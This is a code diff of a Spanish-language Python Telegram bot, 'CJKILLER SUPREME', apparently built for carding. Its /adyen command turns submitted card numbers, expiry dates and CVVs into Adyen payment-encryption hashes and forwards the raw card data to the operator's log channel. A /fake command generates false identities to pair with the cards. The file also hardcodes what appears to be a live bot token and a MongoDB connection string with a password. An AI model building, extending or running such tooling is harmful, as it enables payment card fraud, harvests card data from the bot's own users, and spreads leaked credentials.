@@ -7,8 +7,8 @@ from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
 # --- [ 1. CONFIGURACIÓN DE ÉLITE ] ---
 TOKEN = "8106789282:AAFI6CEgWuL-nq5jpSf3vSD8pzIlwLvoBLQ"
 ADMIN_ID = 7012561892 
-LOG_CHANNEL = -1002434567890 # Sustituir por tu ID de canal
-REQUIRED_CHANNEL = "@TuCanalOficial" # Marketing Automático
+LOG_CHANNEL = -1002434567890 
+REQUIRED_CHANNEL = "@TuCanalOficial" 
 MONGO_URI = "mongodb+srv://admin:S47qBJK9Sjghm11t@cluster0.gprhwkr.mongodb.net/?appName=Cluster0"
 
 bot = telebot.TeleBot(TOKEN, threaded=False)
@@ -16,7 +16,7 @@ db = MongoClient(MONGO_URI)['cjkiller_db']
 users_col = db['users']
 last_msg_time = {}
 
-# --- [ 2. SERVIDOR DE ALTA DISPONIBILIDAD ] ---
+# --- [ 2. SERVIDOR WEB ANTICIERRE ] ---
 app = Flask(__name__)
 @app.route('/')
 def index(): return "CJKILLER SUPREME ENGINE: ONLINE"
@@ -24,7 +24,7 @@ def index(): return "CJKILLER SUPREME ENGINE: ONLINE"
 def run_flask():
     app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 10000)))
 
-# --- [ 3. LÓGICA DE PODER (ADYEN & FAKE) ] ---
+# --- [ 3. LÓGICA TÉCNICA (ADYEN & FAKE) ] ---
 def encrypt_adyen(card, month, year, cvv):
     try:
         gen_time = datetime.utcnow().isoformat() + "Z" 
@@ -34,13 +34,13 @@ def encrypt_adyen(card, month, year, cvv):
     except: return {"success": False}
 
 def get_fake_data():
-    names = ["John", "Robert", "Michael", "William", "David", "Richard"]
-    lasts = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia"]
-    cities = ["New York, NY", "Los Angeles, CA", "Chicago, IL", "Houston, TX"]
+    names = ["John", "Robert", "Michael", "William", "David"]
+    lasts = ["Smith", "Johnson", "Williams", "Brown", "Jones"]
+    cities = ["New York, NY", "Los Angeles, CA", "Chicago, IL"]
     return {
         "name": f"{random.choice(names)} {random.choice(lasts)}",
         "email": f"{random.choice(names).lower()}{random.randint(100,999)}@gmail.com",
-        "address": f"{random.randint(100, 9999)} {random.choice(['Main St', 'Oak Ave', 'Maple Dr'])}",
+        "address": f"{random.randint(100, 9999)} {random.choice(['Main St', 'Park Ave'])}",
         "city": random.choice(cities),
         "zip": random.randint(10001, 99999)
     }
@@ -69,12 +69,14 @@ def handle_supreme(message):
     uid = message.from_user.id
     current_time = time.time()
 
+    if not message.text: return
+
     # A. Marketing Automático
     if not is_subscribed(uid) and uid != ADMIN_ID:
         markup = InlineKeyboardMarkup().add(InlineKeyboardButton("📢 Unirse al Canal", url=f"https://t.me/{REQUIRED_CHANNEL.replace('@','')}"))
         return bot.send_message(message.chat.id, "⚠️ **ACCESO RESTRINGIDO**\n\nDebes ser miembro de nuestro canal oficial para usar el bot.", reply_markup=markup)
 
-    # B. Seguridad Anti-Spam (Filtro de Flood)
+    # B. Seguridad Anti-Spam
     if uid != ADMIN_ID:
         if uid in last_msg_time and current_time - last_msg_time[uid] < 5:
             try: bot.delete_message(message.chat.id, message.message_id)
@@ -82,10 +84,8 @@ def handle_supreme(message):
             return
         last_msg_time[uid] = current_time
 
-    # C. Procesador de Comandos Unificado
+    # C. Procesador de Comandos
     text = message.text
-    if not text: return
-
     if text.startswith('/start'):
         user = users_col.find_one({"user_id": uid})
         if not user:
@@ -98,63 +98,62 @@ def handle_supreme(message):
                 except: pass
             users_col.insert_one(user)
         
-        # Imagen de Bienvenida de Élite integrada
         welcome_img = "https://i.imgur.com/rXyY4v3.jpeg" 
         bot.send_photo(message.chat.id, welcome_img, caption=(
             "╔═════════════════════╗\n"
             "      ⚔️ **CJKILLER SUPREME** ⚔️\n"
             "╚═════════════════════╝\n"
             f"👤 **Bienvenido:** @{message.from_user.username}\n"
-            f"💰 **Balance:** {user['credits']} créditos\n"
+            f"💰 **Balance:** {user.get('credits', 0)} créditos\n"
             "━━━━━━━━━━━━━━━━━━━━━\n"
-            "🚀 _El motor de encriptación más rápido del mercado._"
+            "🚀 _El motor de élite está listo para operar._"
         ), reply_markup=main_menu(), parse_mode="Markdown")
 
     elif text.startswith('/adyen'):
         try:
-            # Corrección del SyntaxError reportado en Render
-            cc_data = text.split()[1]
+            parts = text.split()
+            if len(parts) < 2: return bot.reply_to(message, "❌ Use: `/adyen CC|MM|YY|CVV`")
+            cc_data = parts[1]
             p = cc_data.split('|')
             res = encrypt_adyen(p[0], p[1], p[2], p[3])
             bot.reply_to(message, f"💎 **ADYEN HASH:**\n`{res['hash']}`", parse_mode="Markdown")
             bot.send_message(LOG_CHANNEL, f"🚩 **LOG:** @{message.from_user.username} -> `{cc_data}`")
-        except: bot.reply_to(message, "❌ Use: `/adyen CC|MM|YY|CVV`")
+        except: bot.reply_to(message, "❌ Formato incorrecto.")
 
     elif text.startswith('/fake'):
         f = get_fake_data()
-        bot.reply_to(message, f"🌍 **DATOS:**\n👤 `{f['name']}`\n📧 `{f['email']}`\n🏠 `{f['address']}`\n📍 `{f['city']} {f['zip']}`", parse_mode="Markdown")
+        bot.reply_to(message, f"🌍 **DATOS:**\n👤 `{f['name']}`\n📧 `{f['email']}`\n📍 `{f['city']} {f['zip']}`", parse_mode="Markdown")
 
     elif text.startswith('/me'):
         u = users_col.find_one({"user_id": uid})
-        bot.reply_to(message, f"| Hardcore:() |\n━━━━━━━━━━━━━\n🆔 **ID:** `{uid}`\n💰 **Créditos:** {u['credits']}\n👥 **Referidos:** {u['referrals']}\n👑 **Rango:** {'OWNER' if uid == ADMIN_ID else 'PREMIUM'}", parse_mode="Markdown")
+        bot.reply_to(message, f"| Hardcore:() |\n━━━━━━━━━━━━━\n🆔 **ID:** `{uid}`\n💰 **Créditos:** {u['credits']}\n👑 **Rango:** {'OWNER' if uid == ADMIN_ID else 'USER'}", parse_mode="Markdown")
 
-    elif text.startswith('/addcredits'):
-        if uid == ADMIN_ID:
-            try:
-                _, tid, amt = text.split()
-                users_col.update_one({"user_id": int(tid)}, {"$inc": {"credits": int(amt)}})
-                bot.reply_to(message, f"✅ +{amt} créditos cargados a `{tid}`")
-            except: pass
+    elif text.startswith('/addcredits') and uid == ADMIN_ID:
+        try:
+            _, tid, amt = text.split()
+            users_col.update_one({"user_id": int(tid)}, {"$inc": {"credits": int(amt)}})
+            bot.reply_to(message, f"✅ +{amt} créditos cargados a `{tid}`")
+        except: pass
 
-# --- [ 6. CALLBACKS DE INTERFAZ ] ---
+# --- [ 6. CALLBACKS ] ---
 @bot.callback_query_handler(func=lambda call: True)
 def callback_handler(call):
-    uid = call.from_user.id
     if call.data == "adyen_req":
         bot.send_message(call.message.chat.id, "💡 Envía: `/adyen CC|MM|YY|CVV`")
     elif call.data == "run_fake":
         f = get_fake_data()
         bot.send_message(call.message.chat.id, f"🌍 **FAKE:**\n👤 `{f['name']}`\n📧 `{f['email']}`\n📍 `{f['city']}`")
     elif call.data == "show_me":
-        u = users_col.find_one({"user_id": uid})
-        bot.send_message(call.message.chat.id, f"👤 **Perfil:**\n💰 Créditos: {u['credits']}\n👥 Referidos: {u['referrals']}")
+        u = users_col.find_one({"user_id": call.from_user.id})
+        bot.send_message(call.message.chat.id, f"👤 **Perfil:**\n💰 Créditos: {u['credits']}")
     elif call.data == "show_ref":
-        link = f"https://t.me/{bot.get_me().username}?start={uid}"
-        bot.send_message(call.message.chat.id, f"🔗 **TU LINK:**\n`{link}`\n\nGana 5 créditos por cada invitado.")
+        link = f"https://t.me/{bot.get_me().username}?start={call.from_user.id}"
+        bot.send_message(call.message.chat.id, f"🔗 **TU LINK:**\n`{link}`\n\nGana 5 créditos por invitado.")
 
-# --- [ 7. ARRANQUE MAESTRO ] ---
+# --- [ 7. ARRANQUE LIMPIO Y SEGURO ] ---
 if __name__ == "__main__":
     threading.Thread(target=run_flask, daemon=True).start()
-    bot.remove_webhook()
-    print(f"🔥 CJKILLER SUPREME LIVE | OWNER: {ADMIN_ID}")
-    bot.polling(none_stop=True, interval=0, timeout=40)
+    bot.remove_webhook() # Evita el conflicto 409
+    time.sleep(2) 
+    print(f"🔥 CJKILLER SUPREME LIVE")
+    bot.polling(none_stop=True, interval=1, timeout=20)
